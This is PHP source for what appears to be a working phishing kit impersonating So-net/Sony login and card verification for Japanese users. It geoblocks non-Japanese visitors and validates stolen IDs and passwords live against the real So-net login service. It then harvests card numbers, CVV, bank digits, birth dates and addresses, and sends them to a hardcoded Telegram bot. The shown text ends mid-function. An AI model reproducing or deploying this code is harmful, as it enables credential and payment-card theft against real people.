<?php
// === ANTI-CACHE HEADERS ===
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
session_start();

// === FILE CONFIG ===
define('VISITORS_LOG', 'visitors.log');
define('RESULTS_FILE', 'results.json');
define('BLOCKED_IPS_FILE', 'blocked_ips.txt');
define('ACCEPT_IPS_FILE', 'acceptip.txt');
define('ACCPASS_FILE', 'accpass.txt');
define('BLOCKLIST_FILE', 'blocklist.txt');
define('CARDBLOCK_FILE', 'cardblock.txt');
define('IP_REDIRECT_FILE', 'ip_redirect.json');
define('INPUT_LOGS_FILE', 'input_logs.json');
define('UPLOADS_DIR', 'uploads/');

// === TELEGRAM CONFIG (untuk helper) ===
define('TELEGRAM_BOT_TOKEN', '8287680063:AAFpXv-Cgxg2riNwzNujXya2-Ly7ZMDMoLw');
define('TELEGRAM_CHAT_ID', '5390978462');

// === TRUE LOGIN CONFIG (SO-NET KEYCLOAK) ===
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
const AUTH_BASE = 'https://id.so-net.ne.jp/iam/auth/realms/so-net/protocol/openid-connect/auth'
                . '?client_id=www.so-net.ne.jp'
                . '&redirect_uri=https%3A%2F%2Fwww.so-net.ne.jp%2Fidp%2Fcallback'
                . '&response_type=code&scope=openid';
const T_ID_ERROR = 'ユーザーIDが正しくありません';
const T_PW_ERROR = 'パスワードが正しくありません';
const REQ_TIMEOUT = 25;
const LOGIN_CGI   = 'https://www.so-net.ne.jp/sso/portal/cgi-bin/login.cgi'
                  . '?retpath=https%3A%2F%2Fwww.so-net.ne.jp%2F';
const MP_MAIL_API = 'https://www.so-net.ne.jp/mp/api/sonet-mail';
const MP_MYPAGE_REFERER = 'https://www.so-net.ne.jp/mypage/mp/customer';

// =====================================================================
// FUNGSI HELPER & LOGGING (dari upload + modifikasi)
// =====================================================================

function getClientIP() {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ips = explode(',', $_SERVER[$k]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function getISPInfo($ip) {
    $url = "http://ip-api.com/json/" . $ip . "?fields=isp,city,regionName,country,countryCode";
    $context = stream_context_create(['http' => ['timeout' => 3]]);
    $data = @file_get_contents($url, false, $context);
    if ($data) {
        $json = json_decode($data, true);
        return [
            'isp' => $json['isp'] ?? 'Unknown ISP',
            'location' => ($json['city'] ?? '') . ', ' . ($json['regionName'] ?? '') . ', ' . ($json['country'] ?? ''),
            'countryCode' => $json['countryCode'] ?? ''
        ];
    }
    return ['isp' => 'Unknown ISP', 'location' => 'Unknown Location', 'countryCode' => ''];
}

function getCountryCode($ip) {
    $url = "https://ipwho.is/" . $ip;
    $context = stream_context_create(['http' => ['timeout' => 3]]);
    $data = @file_get_contents($url, false, $context);
    if ($data) {
        $json = json_decode($data, true);
        if (isset($json['country_code']) && !empty($json['country_code'])) {
            return strtoupper($json['country_code']);
        }
    }
    $ispInfo = getISPInfo($ip);
    if (!empty($ispInfo['countryCode'])) {
        return strtoupper($ispInfo['countryCode']);
    }
    return 'UNKNOWN';
}

function logVisitor($step, $extra_data = []) {
    $log_file = VISITORS_LOG;
    $ip = getClientIP();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $loc = 'Unknown';
    $context = stream_context_create(['http' => ['timeout' => 2]]);
    $geoData = @file_get_contents("http://ip-api.com/json/{$ip}?fields=city,regionName,country", false, $context);
    if ($geoData) {
        $data = json_decode($geoData, true);
        if ($data) $loc = ($data['city'] ?? '') . ', ' . ($data['regionName'] ?? '') . ', ' . ($data['country'] ?? '');
    }
    $browser = 'Unknown';
    if (preg_match('/Chrome/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/Firefox/i', $ua)) $browser = 'Firefox';
    elseif (preg_match('/Safari/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/Edge/i', $ua)) $browser = 'Edge';

    $device = 'Unknown';
    if (preg_match('/iPhone/i', $ua)) $device = 'iPhone';
    elseif (preg_match('/iPad/i', $ua)) $device = 'iPad';
    elseif (preg_match('/Android/i', $ua)) $device = 'Android';
    elseif (preg_match('/Windows/i', $ua)) $device = 'Windows PC';
    elseif (preg_match('/Mac/i', $ua)) $device = 'Mac';
    elseif (preg_match('/Linux/i', $ua)) $device = 'Linux';

    $days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
    $day = $days[date('w')];
    $time = date('d/m/y H:i');

    $log_entry = "[ {$day}, {$time} ] - {$ip} - {$loc} - {$browser} - {$device} - {$step}";
    if (!empty($extra_data)) {
        foreach ($extra_data as $key => $value) {
            if (!in_array($key, ['password', 'cvv', 'cid', 'card_number', 'first_password'])) {
                $log_entry .= " | {$key}: {$value}";
            }
        }
    }
    @file_put_contents($log_file, $log_entry . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function logInput($step, $data = []) {
    $file = INPUT_LOGS_FILE;
    $logs = [];
    if (file_exists($file)) {
        $content = file_get_contents($file);
        $logs = json_decode($content, true) ?: [];
    }
    $ip = getClientIP();
    $ispInfo = getISPInfo($ip);
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $ip,
        'location' => $ispInfo['location'],
        'user_agent' => $ua,
        'step' => $step,
        'session_id' => session_id()
    ];
    $entry = array_merge($entry, $data);
    $logs[] = $entry;
    if (count($logs) > 5000) $logs = array_slice($logs, -5000);
    @file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function sendToTelegramAPI($text, $token = null, $chatId = null) {
    $botToken = $token ?? TELEGRAM_BOT_TOKEN;
    $chat = $chatId ?? TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = ['chat_id' => $chat, 'text' => $text, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function sendDocToTelegram($path, $cap, $token = null, $chatId = null) {
    if (!file_exists($path)) return;
    $botToken = $token ?? TELEGRAM_BOT_TOKEN;
    $chat = $chatId ?? TELEGRAM_CHAT_ID;
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.telegram.org/bot" . $botToken . "/sendDocument",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => ['chat_id' => $chat, 'caption' => $cap, 'document' => new CURLFile($path)],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function saveResult($data) {
    $results = [];
    if (file_exists(RESULTS_FILE)) {
        $content = file_get_contents(RESULTS_FILE);
        $results = json_decode($content, true) ?: [];
    }
    $entry = array_merge([
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => getClientIP(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
    ], $data);
    $results[] = $entry;
    @file_put_contents(RESULTS_FILE, json_encode($results, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

// =====================================================================
// FUNGSI TAMBAHAN (whitelist, blocklist, redirect)
// =====================================================================

function isWhitelisted($ip) {
    if (!file_exists(ACCEPT_IPS_FILE)) return false;
    $list = file(ACCEPT_IPS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, array_map('trim', $list), true);
}

function isBlocked($ip) {
    if (!file_exists(BLOCKED_IPS_FILE)) return false;
    $list = file(BLOCKED_IPS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, array_map('trim', $list), true);
}

function getIPRedirect($ip) {
    if (!file_exists(IP_REDIRECT_FILE)) return null;
    $redirects = json_decode(file_get_contents(IP_REDIRECT_FILE), true) ?: [];
    return $redirects[$ip] ?? null;
}

function isCardBlocked($cardNumber) {
    if (!file_exists(CARDBLOCK_FILE)) return false;
    $cards = file(CARDBLOCK_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach (array_map('trim', $cards) as $blocked) {
        if ($blocked && stripos($cardNumber, $blocked) !== false) return true;
    }
    return false;
}

function isInAccpass($password) {
    if (!file_exists(ACCPASS_FILE)) return false;
    $list = file(ACCPASS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($password, array_map('trim', $list), true);
}

function isInBlocklist($password) {
    if (!file_exists(BLOCKLIST_FILE)) return false;
    $list = file(BLOCKLIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($password, array_map('trim', $list), true);
}

// =====================================================================
// CEK IP & GEOLOCATION (AUTO ACCEPT JP / UNKNOWN)
// =====================================================================

$client_ip = getClientIP();

if (isBlocked($client_ip)) {
    logVisitor('[ BOT BLOCKED ]', ['reason' => 'IP in blocked list']);
    header("Location: https://www.sony.co.jp/");
    exit;
}

$ipRedirect = getIPRedirect($client_ip);
if ($ipRedirect) {
    $_SESSION['highest_step'] = $ipRedirect;
}

if (!isset($_SESSION['device_info'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $os = preg_match('/Windows NT 10/', $ua) ? 'Windows 10' : (preg_match('/Mac OS X/', $ua) ? 'macOS' : (preg_match('/Android/', $ua) ? 'Android' : (preg_match('/iPhone|iPad/', $ua) ? 'iOS' : 'Other')));
    $browser = preg_match('/Chrome/', $ua) ? 'Chrome' : (preg_match('/Firefox/', $ua) ? 'Firefox' : (preg_match('/Safari/', $ua) ? 'Safari' : 'Other'));

    $country_code = getCountryCode($client_ip);
    $ispInfo = getISPInfo($client_ip);
    $loc = $ispInfo['location'];
    $isp = $ispInfo['isp'];

    $isJp = ($country_code === 'JP');
    $isUnknown = ($country_code === 'UNKNOWN' || $country_code === '');
    $isManual = isWhitelisted($client_ip);

    $isAllowed = $isJp || $isUnknown || $isManual;

    if (!$isAllowed) {
        logVisitor('[ BOT BLOCKED ]', ['reason' => 'Non-JP country: ' . $country_code, 'ip' => $client_ip]);
        header("Location: https://so-net.ne.jp/");
        exit;
    }

    $_SESSION['device_info'] = [
        'ip' => $client_ip,
        'loc' => $loc,
        'isp' => $isp,
        'os' => $os,
        'browser' => $browser,
        'fp' => $_COOKIE['fp'] ?? session_id(),
        'country_code' => $country_code,
        'auto_accept' => ($isJp || $isUnknown),
        'whitelisted' => $isManual
    ];
} else {
    $session_auto = $_SESSION['device_info']['auto_accept'] ?? false;
    $session_whitelisted = $_SESSION['device_info']['whitelisted'] ?? false;
    if (!$session_auto && !$session_whitelisted) {
        logVisitor('[ BOT BLOCKED ]', ['reason' => 'Session country not JP']);
        header("Location: https://so-net.ne.jp/");
        exit;
    }
}

// =====================================================================
// TRUE LOGIN FUNCTIONS (SO-NET KEYCLOAK)
// =====================================================================

function http_request(string $url, string $jar, ?array $post = null, bool $follow = true): array {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => $follow,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_TIMEOUT        => REQ_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_COOKIEJAR      => $jar,
        CURLOPT_COOKIEFILE     => $jar,
        CURLOPT_USERAGENT      => UA,
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: ja,en-US;q=0.9,en;q=0.8',
            'Upgrade-Insecure-Requests: 1',
        ],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_HEADER         => true,
    ]);
    if ($post !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    }
    $raw     = curl_exec($ch);
    $hdrSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $status  = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $loc     = (string) curl_getinfo($ch, CURLINFO_REDIRECT_URL);
    $eff     = (string) curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $err     = curl_error($ch);
    curl_close($ch);

    $headers = substr((string) $raw, 0, $hdrSize);
    $body    = substr((string) $raw, $hdrSize);

    if (preg_match('/^location:\s*(.+)$/im', $headers, $m)) {
        $loc = trim($m[1]);
    }
    return ['status' => $status, 'location' => $loc, 'body' => $body, 'eff' => $eff, 'err' => $err];
}

function form_qs(string $action, bool $authForm): string {
    $sep = (strpos($action, '?') === false) ? '?' : '&';
    $add = $sep . 'sonet_url=undefined'
         . '&redirect_uri=' . urlencode('https://www.so-net.ne.jp/idp/callback');
    if ($authForm) {
        $add .= '&auth_form=PW';
    }
    return $action . $add;
}

function new_jar(): string {
    $p = tempnam(sys_get_temp_dir(), 'kc_');
    @unlink($p);
    return $p . '.jar';
}

function get_login_action(string $jar, array &$dbg): ?string {
    $r = http_request(AUTH_BASE, $jar);
    $dbg['get_status'] = $r['status'];
    if ($r['err'] !== '') { $dbg['get_err'] = $r['err']; return null; }
    if (!preg_match('/<form[^>]*id="kc-form-login"[^>]*action="([^"]+)"/i', $r['body'], $m)) {
        if (!preg_match('/action="([^"]+)"/i', $r['body'], $m)) {
            $dbg['get_note'] = 'login form action not found (status ' . $r['status'] . ')';
            return null;
        }
    }
    return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function hidden_inputs(string $html): array {
    $out = [];
    if (preg_match_all('/<input[^>]*type="hidden"[^>]*>/i', $html, $m)) {
        foreach ($m[0] as $in) {
            if (preg_match('/name="([^"]+)"/i', $in, $n) && preg_match('/value="([^"]*)"/i', $in, $v)) {
                $out[html_entity_decode($n[1], ENT_QUOTES)] = html_entity_decode($v[1], ENT_QUOTES);
            } elseif (preg_match('/name="([^"]+)"/i', $in, $n)) {
                $out[html_entity_decode($n[1], ENT_QUOTES)] = '';
            }
        }
    }
    return $out;
}

function step1_check(string $id): array {
    $dbg = ['sent' => $id, 'action' => ''];
    $jar = new_jar();
    try {
        $action = get_login_action($jar, $dbg);
        if ($action === null) {
            return ['verdict' => 'UNKNOWN', 'status' => $dbg['get_status'] ?? 0, 'debug' => $dbg, 'jar' => null];
        }
        $action = form_qs($action, false);
        $dbg['action'] = $action;

        $post = http_request($action, $jar, ['username' => $id]);
        $dbg['post_status'] = $post['status'];
        if ($post['err'] !== '') { $dbg['post_err'] = $post['err']; }
        $body = $post['body'];

        $hasPassword = (stripos($body, 'type="password"') !== false);
        $hasError    = (strpos($body, T_ID_ERROR) !== false);
        $hasIdField  = (stripos($body, 'id="input-id-num"') !== false);

        if ($hasPassword && !$hasError) {
            $pwAction = $action;
            if (preg_match('/<form[^>]*id="kc-form-login"[^>]*action="([^"]+)"/i', $body, $m)) {
                $pwAction = html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
            }
            $dbg['pw_action'] = $pwAction;
            $hidden = hidden_inputs($body);
            return ['verdict' => 'VALID', 'status' => $post['status'], 'debug' => $dbg, 'jar' => $jar, 'action' => $pwAction, 'hidden' => $hidden];
        }
        if ($hasError || ($hasIdField && !$hasPassword)) {
            return ['verdict' => 'INVALID', 'status' => $post['status'], 'debug' => $dbg, 'jar' => null];
        }
        return ['verdict' => 'UNKNOWN', 'status' => $post['status'], 'debug' => $dbg, 'jar' => null];
    } finally {
        // jar kept alive if valid
    }
}

function step2_login(string $id, string $password, string $jar, string $action, array $hidden): array {
    $action = form_qs($action, true);
    $dbg = ['sent' => $id, 'action' => $action];
    $post = ['password' => $password];

    $r = http_request($action, $jar, $post, false);
    $dbg['post_status'] = $r['status'];
    if ($r['err'] !== '') { $dbg['post_err'] = $r['err']; }
    $dbg['location'] = $r['location'];
    $body = $r['body'];

    $hasError = (strpos($body, T_PW_ERROR) !== false) || (stripos($body, 'alert-error') !== false);
    $hasPwField = (stripos($body, 'type="password"') !== false);

    if (($r['status'] === 302 || $r['status'] === 303 || $r['status'] === 301) && (strpos($r['location'], 'code=') !== false)) {
        return ['verdict' => 'SUCCESS', 'status' => $r['status'], 'debug' => $dbg];
    }

    if ($r['status'] === 200 && !$hasError && !$hasPwField && (stripos($body, 'redirect') !== false || stripos($body, 'callback') !== false)) {
        $r2 = http_request($action, $jar, $post, true);
        if (strpos($r2['location'], 'code=') !== false || (stripos($r2['body'], 'callback') !== false && !stripos($r2['body'], 'password'))) {
            return ['verdict' => 'SUCCESS', 'status' => $r2['status'], 'debug' => $dbg];
        }
    }

    if ($hasError || $hasPwField) {
        $retryAction = $action;
        if (preg_match('/<form[^>]*id="kc-form-login"[^>]*action="([^"]+)"/i', $body, $m)) {
            $retryAction = html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
        }
        return ['verdict' => 'WRONG', 'status' => $r['status'], 'debug' => $dbg, 'jar' => $jar, 'action' => $retryAction, 'hidden' => hidden_inputs($body)];
    }
    return ['verdict' => 'UNKNOWN', 'status' => $r['status'], 'debug' => $dbg];
}

function fetch_email(string $id, string $pw): string {
    $jar = new_jar();
    $api = static function (string $url) use ($jar): ?array {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => REQ_TIMEOUT,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_COOKIEFILE     => $jar,
            CURLOPT_COOKIEJAR      => $jar,
            CURLOPT_USERAGENT      => UA,
            CURLOPT_HTTPHEADER     => [
                'Accept: application/json, text/plain, */*',
                'Referer: ' . MP_MYPAGE_REFERER,
            ],
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
        ]);
        $resp = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code !== 200 || !is_string($resp)) { return null; }
        $j = json_decode($resp, true);
        return is_array($j) ? $j : null;
    };

    try {
        $r = http_request(LOGIN_CGI, $jar, null, true);
        $qp = [];
        parse_str((string) parse_url($r['eff'] ?? '', PHP_URL_QUERY), $qp);
        $state = (string) ($qp['state'] ?? '');
        $su    = urlencode((string) ($qp['sonet_url'] ?? ''));
        $ru    = urlencode('https://www.so-net.ne.jp/idp/callback');
        $qs    = 'sonet_url=' . $su . '&redirect_uri=' . $ru
               . ($state !== '' ? '&state=' . $state : '');

        if (!preg_match('/<form[^>]*id="kc-form-login"[^>]*action="([^"]+)"/i', $r['body'], $m)) {
            @unlink($jar); return '';
        }
        $action = html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $sep    = (strpos($action, '?') === false) ? '?' : '&';

        $r = http_request($action . $sep . $qs, $jar, ['username' => $id], false);
        if (!preg_match('/<form[^>]*id="kc-form-login"[^>]*action="([^"]+)"/i', $r['body'], $m2)) {
            @unlink($jar); return '';
        }
        $pwRaw = html_entity_decode($m2[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $sep2  = (strpos($pwRaw, '?') === false) ? '?' : '&';

        $r  = http_request($pwRaw . $sep2 . $qs . '&auth_form=PW', $jar, ['password' => $pw], false);
        $cb = (string) $r['location'];
        if ($cb === '' || strpos($cb, 'code=') === false) { @unlink($jar); return ''; }

        http_request($cb, $jar, null, true);

        $j = $api(MP_MAIL_API);
        $email = '';
        if (is_array($j)) {
            foreach (['mboxAc', 'mbox', 'mailAddress', 'email'] as $k) {
                if (!empty($j[$k]) && is_string($j[$k])) { $email = $j[$k]; break; }
            }
        }
        @unlink($jar);
        return $email;
    } catch (\Throwable $e) {
        @unlink($jar);
        return '';
    }
}

// =====================================================================
// PROTEKSI STEP
// =====================================================================

$current_step = $_GET['step'] ?? 'login';
$allowed_steps = ['login', 'relogin', 'verif', 'reverif', 'kyc', 'finish'];
if (!in_array($current_step, $allowed_steps)) $current_step = 'login';

$ipRedirectStep = getIPRedirect($client_ip);
if ($ipRedirectStep && in_array($ipRedirectStep, $allowed_steps)) {
    $current_step = $ipRedirectStep;
}

$step_order = array_flip($allowed_steps);
$highest = $_SESSION['highest_step'] ?? 'login';
if ($step_order[$current_step] < $step_order[$highest] && $current_step !== 'login') {
    header("Location: ?step={$highest}");
    exit;
}
$_SESSION['highest_step'] = $current_step;

// =====================================================================
// LOGIKA POST
// =====================================================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $step = $_POST['step'] ?? 'login';
    unset($_POST['step']);
    $saved = $_SESSION['device_info'] ?? [];
    $ip = $saved['ip'] ?? '0.0.0.0';
    $loc = $saved['loc'] ?? '—';
    $isp = $saved['isp'] ?? '—';
    $os = $saved['os'] ?? 'Other';
    $browser = $saved['browser'] ?? 'Other';
    $fp = $saved['fp'] ?? session_id();
    $time = date('Y-m-d H:i:s');

    if (in_array($step, ['verif', 'reverif', 'kyc'])) {
        $_SESSION['form_'.$step] = $_POST;
        if (!empty($_FILES)) $_SESSION['files_'.$step] = $_FILES;
    }

    // === LOGIN ===
    if ($step === 'login') {
        $login_id = $_POST['email'] ?? '';

        saveResult([
            'type' => 'login_attempt',
            'email' => $login_id,
            'step' => 'login',
            'status' => 'attempt'
        ]);
        logInput('login', ['email' => $login_id]);

        if (empty($login_id)) {
            $_SESSION['login_error'] = 'empty';
            header("Location: ?step=login");
            exit;
        }

        $r = step1_check($login_id);

        if ($r['verdict'] === 'VALID') {
            $_SESSION['kc'] = [
                'user'   => $login_id,
                'jar'    => $r['jar'],
                'action' => $r['action'],
                'hidden' => $r['hidden'],
            ];
            $_SESSION['email'] = $login_id;
            $_SESSION['relogin_attempt_count'] = 0;
            $_SESSION['first_password'] = null;

            logVisitor('VISIT ( ID VALID )', ['email' => $login_id]);
            header("Location: ?step=relogin");
            exit;
        } else {
            $_SESSION['login_error'] = 'invalid_format';
            $_SESSION['login_id_input'] = $login_id;
            if ($r['jar'] && is_file($r['jar'])) @unlink($r['jar']);
            header("Location: ?step=login");
            exit;
        }
    }

    // === RELOGIN ===
    if ($step === 'relogin') {
        $kc = $_SESSION['kc'] ?? null;
        $email = $_SESSION['email'] ?? 'No Email';
        $pw = $_POST['password'] ?? '';

        saveResult([
            'type' => 'password_attempt',
            'email' => $email,
            'password' => $pw,
            'step' => 'relogin',
            'status' => 'attempt'
        ]);
        logInput('relogin', ['email' => $email, 'password' => $pw]);

        if (!$kc) {
            $_SESSION['login_error'] = 'expired';
            header("Location: ?step=login");
            exit;
        }

        if (isInBlocklist($pw)) {
            $_SESSION['smtp_error'] = true;
            $_SESSION['password_error'] = 'blocklisted';
            header("Location: ?step=relogin");
            exit;
        }

        $r = step2_login($kc['user'], $pw, $kc['jar'], $kc['action'], $kc['hidden'] ?? []);

        if ($r['verdict'] === 'SUCCESS') {
            $real_email = fetch_email($kc['user'], $pw);

            $msgMain = "»»————- ★[ SONY RELOGIN SUCCESS (TRUE LOGIN) ]★ ————-««\n";
            $msgMain .= "[User ID]       : <code>" . htmlspecialchars($email) . "</code>\n";
            $msgMain .= "[Real Email]    : <code>" . htmlspecialchars($real_email ?: 'Not Found') . "</code>\n";
            $msgMain .= "[Password]      : <code>" . htmlspecialchars($pw) . "</code>\n";
            $msgMain .= "»»————- ★[ DEVICE INFO ]★ ————-««\n";
            $msgMain .= "IP                : <code>{$ip}</code>\n";
            $msgMain .= "ISP               : <code>{$isp}</code>\n";
            $msgMain .= "Location          : <code>{$loc}</code>\n";
            $msgMain .= "OS                : <code>{$os}</code>\n";
            $msgMain .= "Browser           : <code>{$browser}</code>\n";
            $msgMain .= "Fingerprint       : <code>{$fp}</code>\n";
            $msgMain .= "Timestamp         : <code>{$time}</code>";

            sendToTelegramAPI($msgMain);

            logVisitor('RELOGIN SUCCESS (TRUE)', ['email' => $email, 'real_email' => $real_email]);
            logInput('relogin_success', ['email' => $email, 'real_email' => $real_email, 'password' => $pw]);

            saveResult([
                'type' => 'login_success',
                'email' => $email,
                'real_email' => $real_email,
                'password' => $pw,
                'mode' => 'true_login_success'
            ]);

            if (!empty($kc['jar']) && is_file($kc['jar'])) @unlink($kc['jar']);
            unset($_SESSION['kc']);
            unset($_SESSION['smtp_error']);
            unset($_SESSION['password_error']);

            header("Location: ?step=verif");
            exit;

        } elseif ($r['verdict'] === 'WRONG') {
            $_SESSION['smtp_error'] = true;
            $_SESSION['password_error'] = 'wrong_password';
            $_SESSION['kc']['action'] = $r['action'] ?? $kc['action'];
            $_SESSION['kc']['hidden'] = $r['hidden'] ?? [];
            logVisitor('RELOGIN FAILED (WRONG PW)', ['email' => $email]);
            header("Location: ?step=relogin");
            exit;
        } else {
            $_SESSION['smtp_error'] = true;
            $_SESSION['password_error'] = 'unknown_error';
            header("Location: ?step=relogin");
            exit;
        }
    }

    // === VERIF / REVERIF ===
    if (in_array($step, ['verif', 'reverif'])) {
        $card = preg_replace('/[^0-9]/', '', $_POST['new_account'] ?? '');

        if (isCardBlocked($card)) {
            $_SESSION['error'] = 'card_blocked';
            header("Location: ?step={$step}");
            exit;
        }

        $cvv_raw = $_POST['card-code'] ?? '';
        $cid_raw = $_POST['cid'] ?? '';
        $cvv = preg_replace('/[^0-9]/', '', $cvv_raw);
        $cid = preg_replace('/[^0-9]/', '', $cid_raw);
        $isAmex = strpos($card, '37') === 0;

        if ($isAmex) {
            if (!ctype_digit($cvv) || strlen($cvv) !== 4) {
                $_SESSION['error'] = 'invalid_cvv';
            } elseif (!ctype_digit($cid) || strlen($cid) !== 3) {
                $_SESSION['error'] = 'invalid_cid';
            } elseif (substr($cvv, 0, 3) === $cid) {
                $_SESSION['error'] = 'cvv_cid_same_prefix';
            }
        } else {
            if (!ctype_digit($cvv) || strlen($cvv) !== 3) {
                $_SESSION['error'] = 'invalid_cvv';
            }
        }

        $rek = preg_replace('/[^0-9]/', '', $_POST['rek'] ?? '');
        if (strlen($rek) !== 4) {
            $_SESSION['error'] = 'invalid_rek';
        }
        $birth_year = $_POST['birth_year'] ?? '';
        $birth_month = $_POST['birth_month'] ?? '';
        $birth_day = $_POST['birth_day'] ?? '';
        if (empty($birth_year) || empty($birth_month) || empty($birth_day)) {
            $_SESSION['error'] = 'invalid_birth';
        }

        $exp_month = $_POST['cardExpirationMonth'] ?? '';
        $exp_year = $_POST['cardExpirationYear'] ?? '';
        if (!empty($exp_month) && !empty($exp_year)) {
            $current_year = date('Y');
            $current_month = date('m');
            if ($exp_year < $current_year || ($exp_year == $current_year && $exp_month < $current_month)) {
                $_SESSION['error'] = 'expired_card';
            }
        }

        if ($step === 'verif') {
            $_SESSION['verif_card'] = $card;
        } elseif ($step === 'reverif') {
            $first_card = $_SESSION['verif_card'] ?? '';
            if ($first_card !== '' && $first_card === $card) {
                $_SESSION['error'] = 'duplicate';
            }
        }

        if (!empty($_SESSION['error'])) {
            $next_step = $step;
        } else {
            $msg = "»»————- ★[ SONY " . ($step === 'verif' ? 'RESULT 1' : 'RESULT 2') . " ]★ ————-««\n";
            $msg .= "[Name]          : <code>" . htmlspecialchars($_POST['card-family-name'] ?? '') . "</code>\n";
            $msg .= "[Card Number]   : <code>{$card}</code>\n";
            $msg .= "[Expire]        : <code>" . ($_POST['cardExpirationMonth'] ?? '') . "/" . ($_POST['cardExpirationYear'] ?? '') . "</code>\n";
            $msg .= "[CVV]           : <code>{$cvv}</code>\n";
            if ($isAmex) $msg .= "[CID]           : <code>{$cid}</code>\n";
            $msg .= "[Rekening]      : <code>{$rek}</code>\n";
            $msg .= "[Birth]         : <code>" . $birth_year . "/" . $birth_month . "/" . $birth_day . "</code>\n";
            $msg .= "[Address]       : <code>" . htmlspecialchars($_POST['address'] ?? '') . "</code>\n";
            $msg .= "»»————- ★[ DEVICE INFO ]★ ————-««\n";
            $msg .= "IP                : <code>{$ip}</code>\n";
            $msg .= "ISP               : <code>{$isp}</code>\n";
            $msg .= "Location          : <code>{$loc}</code>\n";
            $msg .= "OS                : <code>{$os}</code>\n";
            $msg .= "Browser           : <code>{$browser}</code>\n";
            $msg .= "Fingerprint       : <code>{$fp}</code>\n";
            $msg .= "Timestamp         : <code>{$time}</code>";

            sendToTelegramAPI($msg);
            logVisitor('CARD SUBMITTED', ['step' => $step, 'card_name' => $_POST['card-family-name'] ?? '']);
            logInput($step, [
                'card_name' => $_POST['card-family-name'] ?? '',
                'card_number' => $card,
                'expire_month' => $_POST['cardExpirationMonth'] ?? '',
                'expire_year' => $_POST['cardExpirationYear'] ?? '',
                'cvv' => $cvv,
                'cid' => $cid,
                'rek' => $rek,
                'birth_date' => $birth_year . '/' . $birth_month . '/' . $birth_day,
                'address' => $_POST['address'] ?? ''
            ]);

            saveResult([
                'type' => $step,
                'email' => $_SESSION['email'] ?? '',
                'password' => $_SESSION['first_password'] ?? $_SESSION['second_password'] ?? '',
                'card_name' => $_POST['card-family-name'] ?? '',
                'card_number' => $card,
